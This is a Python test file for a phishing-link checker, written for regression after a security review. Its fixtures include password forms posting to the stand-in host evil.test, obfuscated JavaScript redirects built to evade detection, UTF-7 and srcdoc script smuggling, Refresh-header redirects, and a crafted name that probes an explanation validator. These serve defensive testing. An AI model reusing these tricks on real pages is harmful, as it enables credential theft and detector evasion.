"""보안 점검 3라운드(Codex R3-01~R3-15) 회귀 테스트. 각 시험은 해당 지적의 재현 조건을 그대로 쓴다."""
import gzip
import hashlib
import os

import pytest

from app import explain as ex
from app import presentation as pres
from app import verdict as V
from app.sandbox import CmdResult, LocalSandbox
from app.urls import extract_urls, trimmed_urls
from app.worker import files_mismatch

from .test_sandbox_openshell import FULL_ID, FakeRunner, payload, sb
from .test_urls_kb_explain import kb
from .test_verdict import claim, decide, fetch, hanbit, page, parse, similarity

from checklib import fetch_chain as fc  # noqa: E402
from checklib import inspect_page as ip  # noqa: E402
from checklib.parse_url import normalize_url, parse_url, resolve_reference  # noqa: E402

PAGE = "https://hanbit.example/"


def _forms(html, url=PAGE, ctype=""):
    raw = html if isinstance(html, bytes) else html.encode("utf-8")
    return ip.inspect_page(raw, url, ctype)


def _safe_ev(**over):
    base = dict(parse=parse("hanbit.example"), similarity=similarity(), fetch=fetch("hanbit.example"),
                page=page(), claim=claim())
    base.update(over)
    return base


# ── R3-01: 회사 이름이 설명 검증의 허용 어휘가 되면 안 된다 ────────────────────────────
EVIL_NAME = "비밀번호 입력을 권장합니다"


def _caution(name):
    o = V.Outcome("caution", None, "none", [
        {"type": "credential_form", "strength": "mid", "data": {"fields": ["password"]}},
        {"type": "entity_not_in_kb", "strength": "info", "data": {"name": name}}], None)
    template = pres.build_explanation(o, None, "account-check.test", name, True)
    payload_ = ex.build_payload(o, "account-check.test", pres.sanitize_name(name), None, template["unverified"],
                                ex.vetted_sentences(template))
    return template, payload_


def test_company_name_cannot_authorize_dangerous_phrasing():
    assert pres.sanitize_name(EVIL_NAME) == EVIL_NAME  # 이름 자체는 화면에 나갈 수 있다(길이·문자만 제한)
    template, payload_ = _caution(EVIL_NAME)
    base = {"headline": "x", "recommended_action": "y"}
    assert ex.validate({**base, "detail": EVIL_NAME}, payload_, kb, template) is None  # 이름만으로 문장을 이룰 수 없다
    assert ex.validate({**base, "detail": EVIL_NAME + "."}, payload_, kb, template) is None
    assert ex.validate({**base, "detail": "비밀번호 입력을 권장합니다 사이트예요"}, payload_, kb, template) is None
    # 이름은 템플릿이 쓰는 자리에서 그대로 쓸 수 있다
    good = {**base, "detail": f"\"{EVIL_NAME}\"의 진짜 주소는 저희 목록에 없어요."}
    assert ex.validate(good, payload_, kb, template)
    assert ex.validate({**base, "detail": "◇의 진짜 주소는 저희 목록에 없어요."}, payload_, kb, template) is None


# ── R3-02: 첫 접속 주소는 500자에서 잘리지 않은 전체로 묶는다 ────────────────────────────
def test_urls_sharing_a_long_prefix_are_not_interchangeable():
    pad = "https://hanbit.example/?pad=" + "x" * 500
    asked, other = pad + "&mode=phish", pad + "&mode=benign"
    host = parse_url(asked)
    files = {"fetch_chain": {"ok": True, "final_registrable_domain": "hanbit.example", "final_url": other[:500],
                             "chain": [{"url": other[:500], "url_sha256": hashlib.sha256(other.encode()).hexdigest(),
                                        "host": "hanbit.example", "registrable_domain": "hanbit.example",
                                        "blocked": False, "error": None}]}}
    assert files_mismatch(files, host, asked) == "fetch_chain.first_url"
    files["fetch_chain"]["chain"][0]["url_sha256"] = hashlib.sha256(asked.encode()).hexdigest()
    assert files_mismatch(files, host, asked) is None
    del files["fetch_chain"]["chain"][0]["url_sha256"]  # 결합 필드가 없으면 거부한다
    assert files_mismatch(files, host, asked) == "fetch_chain.first_url"


def test_fetch_chain_records_the_full_url_digest():
    long_url = "https://hanbit.example/?pad=" + "x" * 600

    class One:
        def get(self, url):
            return fc.Response(200, None, b"<html></html>")

    result, _ = fc.fetch_chain(long_url, One())
    hop = result["chain"][0]
    assert len(hop["url"]) == 500 and hop["url_sha256"] == hashlib.sha256(normalize_url(long_url)[0].encode()).hexdigest()


# ── R3-03: 문장 끝 부호를 지운 주소는 원래 주소와 다를 수 있다 ─────────────────────────────
@pytest.mark.parametrize("text,cleaned", [
    ("https://hanbit.example/login!", "https://hanbit.example/login"),
    ("https://hanbit.example/?route=phish;", "https://hanbit.example/?route=phish"),
    ("확인하세요 https://hanbit.example/a.", "https://hanbit.example/a"),
])
def test_trailing_punctuation_marks_the_url_as_trimmed(text, cleaned):
    assert extract_urls(text) == [cleaned] and cleaned in trimmed_urls(text)


def test_untouched_urls_are_not_marked_trimmed():
    assert trimmed_urls("https://hanbit.example/login and https://hanbit.example/a?b=c") == set()
    assert "url_trimmed" in V.verification_gaps(V.Evidence(**_safe_ev(), url_trimmed=True), hanbit)


# ── R3-04: 슬래시가 여러 개 이어진 주소는 브라우저에서 다른 호스트다 ────────────────────────
@pytest.mark.parametrize("ref,expect", [
    ("////evil.test", "https://evil.test"),
    ("\\\\/evil.test/x", "https://evil.test/x"),
    ("http:evil.test", "http://evil.test"),
    ("https:////evil.test", "https://evil.test"),
    ("//evil.test/p", "https://evil.test/p"),
])
def test_resolve_reference_matches_whatwg(ref, expect):
    assert resolve_reference(PAGE, ref).startswith(expect)


def test_same_scheme_without_slashes_is_relative():
    assert resolve_reference("https://hanbit.example/a/b", "https:c") == "https://hanbit.example/a/c"
    assert resolve_reference(PAGE, "javascript:alert(1)").startswith("javascript:")


def test_multi_slash_form_action_is_cross_domain():
    r = _forms('<form action="////evil.test"><input type=password></form>')
    assert r["forms"][0]["cross_domain"] is True and r["forms"][0]["action_registrable_domain"] == "evil.test"
    r = _forms('<form action="http:evil.test"><input type=password></form>')
    assert r["forms"][0]["cross_domain"] is True


def test_location_header_with_many_slashes_follows_the_browser():
    class Two:
        urls: list = []

        def __init__(self):
            self.urls = []
            self.r = [fc.Response(302, "////evil.test/x"), fc.Response(200, None, b"<html></html>")]

        def get(self, url):
            self.urls.append(url)
            return self.r.pop(0)

    f = Two()
    fc.fetch_chain(PAGE, f)
    assert f.urls[1] == "https://evil.test/x"


# ── R3-05: form 속성으로 폼 밖의 컨트롤이 폼에 속한다 ─────────────────────────────────────
def test_controls_outside_a_form_belong_to_it_through_the_form_attribute():
    r = _forms('<form id=f><input type=password name=p></form><button form=f formaction="https://evil.test">Go</button>')
    f = r["forms"][0]
    assert f["cross_domain"] is True and f["action_registrable_domain"] == "evil.test"
    r = _forms('<form id=f action="https://evil.test"></form><input form=f type=password name=p>')
    assert r["forms"][0]["field_types"] == ["password"] and r["forms"][0]["cross_domain"] is True


def test_nested_form_start_tag_is_ignored_like_a_browser():
    r = _forms('<form action="https://evil.test"><form action="/ok"><input type=password></form></form>')
    assert len(r["forms"]) == 1 and r["forms"][0]["cross_domain"] is True


# ── R3-06: 입력란이 없는 폼도 전송 대상을 본다 ─────────────────────────────────────────────
def test_forms_without_retained_inputs_still_report_their_destination():
    r = _forms('<form action="https://evil.test"><input type=hidden name=t value=secret><button>Go</button></form>')
    assert len(r["forms"]) == 1 and r["forms"][0]["cross_domain"] is True and r["forms"][0]["field_types"] == []
    ev = _safe_ev(page={**page(), **{"forms": r["forms"]}})
    assert decide(**ev).verdict != "safe"
    assert "cross_domain_form" in {s["type"] for s in decide(**ev).signals}
    # 입력도 없고 다른 곳으로 가지도 않는 폼은 알릴 것이 없다
    assert _forms('<form action="/x"><button>Go</button></form>')["forms"] == []


# ── R3-07: 협력 도메인 한 곳이 다른 전송 대상을 면제하면 안 된다 ────────────────────────────
def test_trusted_destination_does_not_exempt_other_destinations():
    r = _forms('<form action="https://pay-partner.example"><input type=password>'
               '<button formaction="https://evil.test">Go</button></form>')
    f = r["forms"][0]
    assert {d["registrable_domain"] for d in f["destinations"]} == {"pay-partner.example", "evil.test"}
    ent = kb.by_id["hanbit"]
    partner = next(iter(ent.partner_domains)) if ent.partner_domains else None
    assert partner
    mixed = {**f, "destinations": [{"host": partner, "registrable_domain": partner, "cross_domain": True},
                                   {"host": "evil.test", "registrable_domain": "evil.test", "cross_domain": True}],
             "action_host": partner, "action_registrable_domain": partner}
    o = decide(**_safe_ev(page={**page(), "forms": [mixed]}))
    xs = [s for s in o.signals if s["type"] == "cross_domain_form"]
    assert o.verdict != "safe" and xs and xs[0]["data"]["action_domain"] == "evil.test"
    only_partner = {**mixed, "destinations": mixed["destinations"][:1]}
    o2 = decide(**_safe_ev(page={**page(), "forms": [only_partner]}))
    assert "cross_domain_form" not in {s["type"] for s in o2.signals}


# ── R3-08: 중복 속성은 첫 값이 유효하다 ───────────────────────────────────────────────────
def test_first_duplicate_attribute_wins():
    r = _forms('<script src="https://evil.test/a.js" src="/ok.js"></script>')
    assert r["external_active_domains"] == ["evil.test"]
    r = _forms('<form action="https://evil.test" action="/ok"><input type=password></form>')
    assert r["forms"][0]["cross_domain"] is True


# ── R3-09: srcdoc와 SVG script href ─────────────────────────────────────────────────────
def test_iframe_srcdoc_and_svg_script_references_are_inspected():
    r = _forms('<iframe srcdoc="&lt;script src=https://evil.test/a.js&gt;&lt;/script&gt;"></iframe>')
    assert "evil.test" in r["external_active_domains"]
    r = _forms('<svg><script href="https://evil.test/a.js"></script></svg>')
    assert r["external_active_domains"] == ["evil.test"]
    r = _forms('<svg><script xlink:href="https://evil.test/a.js"></script></svg>')
    assert r["external_active_domains"] == ["evil.test"]
    r = _forms('<iframe srcdoc="&lt;form action=https://evil.test&gt;&lt;input type=password&gt;&lt;/form&gt;"></iframe>')
    assert r["forms"] and r["forms"][0]["cross_domain"] is True


def test_deeply_nested_srcdoc_is_not_silently_ignored():
    doc = "<p>end</p>"
    for _ in range(6):
        doc = "<iframe srcdoc=\"" + doc.replace("&", "&amp;").replace('"', "&quot;") + "\"></iframe>"
    assert "(nested)" in _forms(doc)["external_active_domains"]


# ── R3-10: 이동 코드 감지 우회 ─────────────────────────────────────────────────────────────
@pytest.mark.parametrize("script", [
    'window["location"]="https://evil.test"',
    'location/**/="https://evil.test"',
    'location//c\n="https://evil.test"',
    'var w=window; w["loca"+"tion"]="https://evil.test"',
    'top["\\u006cocation"]="https://evil.test"',
    'window[atob("bG9jYXRpb24=")]="https://evil.test"',
    'x = "/*"; location="https://evil.test"; y = "*/"',
    'self.open("https://evil.test")',
    'f.action="https://evil.test"',
])
def test_script_navigation_variants_are_detected(script):
    assert _forms(f"<script>{script}</script>")["js_redirect_hint"] is True


def test_handlers_and_plain_scripts():
    assert _forms('<body onload="location=\'https://evil.test\'">')["js_redirect_hint"] is True
    assert _forms("<script>var total = a + b; console.log(total)</script>")["js_redirect_hint"] is False


def test_unterminated_comment_scan_is_linear():
    import time

    t0 = time.time()
    _forms("<script>" + "location/*" * 100_000 + "</script>")
    assert time.time() - t0 < 5


# ── R3-11: 브라우저가 모르는 문자셋 이름 ────────────────────────────────────────────────────
def test_unknown_charset_labels_are_ignored_like_a_browser():
    body = b'+ADwAIQAtAC0-<script src="https://evil.test/a.js"></script>+AC0ALQA+-'
    r = _forms(body, ctype="text/html; charset=utf-7")
    assert r["ok"] and r["external_active_domains"] == ["evil.test"]  # 파이썬은 utf-7을 주석으로 읽는다
    r = _forms(b'<meta charset="utf-7"><script src="https://evil.test/a.js"></script>')
    assert r["external_active_domains"] == ["evil.test"]


def test_replacement_encodings_and_known_encodings():
    assert _forms(b"<p>x</p>", ctype="text/html; charset=iso-2022-kr")["ok"] is False
    kr = '<form action="https://evil.test"><input type=password></form>'.encode("euc-kr")
    assert _forms(kr, ctype="text/html; charset=euc-kr")["forms"][0]["cross_domain"] is True
    # meta로 선언한 UTF-16은 UTF-8로 본다
    r = _forms(b'<meta charset="utf-16"><script src="https://evil.test/a.js"></script>')
    assert r["external_active_domains"] == ["evil.test"]
    assert ip._decode("<p>x</p>".encode("utf-32"), "") is None  # 브라우저는 UTF-32 BOM을 알아보지 못한다(NUL이 섞여 실패)


# ── R3-12: 이어 붙인 gzip 멤버 ────────────────────────────────────────────────────────────
def test_concatenated_gzip_members_are_rejected():
    two = gzip.compress(b"<p>hello</p>") + gzip.compress(b'<script src="https://evil.test/a.js"></script>')
    with pytest.raises(fc.FetchError):
        fc._read_bounded(iter([two]), "gzip")
    with pytest.raises(fc.FetchError):  # 조각으로 나뉘어 와도 같다
        fc._read_bounded(iter([two[:20], two[20:]]), "gzip")
    with pytest.raises(fc.FetchError):
        fc._read_bounded(iter([gzip.compress(b"<p>a</p>"), b"trailing"]), "gzip")


def test_truncated_compressed_stream_is_marked_truncated():
    z = gzip.compress(b"<p>hello world</p>" * 50)
    body, truncated = fc._read_bounded(iter([z[: len(z) // 2]]), "gzip")
    assert truncated is True
    assert fc._read_bounded(iter([z]), "gzip") == (b"<p>hello world</p>" * 50, False)


# ── R3-13: Refresh 헤더 ───────────────────────────────────────────────────────────────────
def test_refresh_header_prevents_safe():
    class R:
        def get(self, url):
            return fc.Response(200, None, b"<html><p>hi</p></html>", refresh="0;url=https://evil.test")

    result, _ = fc.fetch_chain(PAGE, R())
    assert result["chain"][0]["refresh"] is True
    ev = _safe_ev(fetch={**fetch("hanbit.example"), "chain": [{**fetch("hanbit.example")["chain"][0], "refresh": True}]})
    assert decide(**ev).verdict != "safe" and "client_redirect" in V.verification_gaps(V.Evidence(**ev), hanbit)
    assert fc._refresh_navigates("5") is False and fc._refresh_navigates("0; https://evil.test") is True
    assert fc._refresh_navigates(None) is False


def test_httpx_fetcher_keeps_the_refresh_header():
    httpx = pytest.importorskip("httpx")

    def handler(request):
        return httpx.Response(200, headers={"content-type": "text/html", "refresh": "0;url=https://evil.test"},
                              stream=httpx.ByteStream(b"<html></html>"))

    f = fc.HttpxFetcher()
    f._client = httpx.Client(transport=httpx.MockTransport(handler), follow_redirects=False)
    assert f.get(PAGE).refresh == "0;url=https://evil.test"


# ── R3-14: 시작할 때 원격 폴더 목록을 확인하지 못하면 재사용하지 않는다 ──────────────────────────
class _ListFails(FakeRunner):
    ls_ok = False

    def __call__(self, args, timeout=None):
        if args[-3:-1] == ["sh", "-c"] and "ls -1 /sandbox/work" in args[-1]:
            self.calls.append(args)
            return CmdResult(0 if self.ls_ok else 1, "", "" if self.ls_ok else "exec failed")
        return super().__call__(args, timeout)


def test_unverified_remote_workdir_listing_blocks_investigations_until_it_succeeds(tmp_path):
    r = _ListFails()
    s = sb(r, tmp_path)
    s.prepare()
    assert s._remote_reconciled is False and s.health()["sandbox"]["ok"] is False
    res = s.investigate(FULL_ID, {**payload(), "job_id": FULL_ID}, "a.test", True)
    assert res.incomplete == "sandbox_unsafe" and not any("openclaw" in c for c in r.calls)
    r.ls_ok = True
    s.retry_pending()  # 주기 작업이 다시 확인한다
    assert s._remote_reconciled is True
    res = s.investigate(FULL_ID, {**payload(), "job_id": FULL_ID}, "a.test", True)
    assert res.incomplete != "sandbox_unsafe"


def test_listing_command_treats_a_missing_directory_as_empty(tmp_path):
    r = FakeRunner()
    assert sb(r, tmp_path)._reconcile_remote() is True
    cmd = next(c for c in r.calls if c[-3:-1] == ["sh", "-c"])
    assert "[ -d /sandbox/work ]" in cmd[-1]  # 폴더가 없는 새 샌드박스는 실패가 아니라 빈 목록이다


# ── R3-15: 호스트 작업 폴더 삭제 실패·고아 폴더 ────────────────────────────────────────────────
def test_failed_host_deletion_is_retried_and_reported(tmp_path, monkeypatch):
    import shutil

    r = FakeRunner()
    s = sb(r, tmp_path)
    real = shutil.rmtree
    state = {"fail": True}

    def flaky(path, *a, **k):
        if state["fail"] and os.path.basename(str(path)) == FULL_ID and not k.get("ignore_errors"):
            raise PermissionError("locked")
        return real(path, *a, **k)

    monkeypatch.setattr("app.sandbox.shutil.rmtree", flaky)
    s.investigate(FULL_ID, {**payload(), "job_id": FULL_ID}, "a.test", True)
    assert (tmp_path / FULL_ID).exists() and s.pending_local() == 1
    assert s.health()["sandbox"]["ok"] is False
    state["fail"] = False
    s.retry_pending()
    assert not (tmp_path / FULL_ID).exists() and s.pending_local() == 0


def test_orphaned_host_dirs_are_removed_at_startup_but_active_jobs_are_kept(tmp_path):
    orphan = tmp_path / ("j_" + "ab" * 16)
    active = tmp_path / ("j_" + "cd" * 16)
    for d in (orphan, active):
        d.mkdir()
        (d / "input.json").write_text("문자 원문")
    (tmp_path / "not-a-job").mkdir()
    s = sb(FakeRunner(), tmp_path)
    s._begin_local(active.name)
    s.prepare()
    assert not orphan.exists() and active.exists() and (tmp_path / "not-a-job").exists()
    s._end_local(active.name)
    assert not active.exists()


def test_local_sandbox_cleans_up_even_when_a_check_crashes(tmp_path, monkeypatch):
    s = LocalSandbox(fixtures_dir=tmp_path, workdir=tmp_path)

    def boom(*a, **k):
        raise RuntimeError("check crashed")

    monkeypatch.setattr(s, "_py", boom)
    with pytest.raises(RuntimeError):
        s.investigate(FULL_ID, {**payload(), "job_id": FULL_ID}, "a.test", True)
    assert not (tmp_path / FULL_ID).exists()
    (tmp_path / ("j_" + "ef" * 16)).mkdir()
    s.prepare()
    assert not (tmp_path / ("j_" + "ef" * 16)).exists()
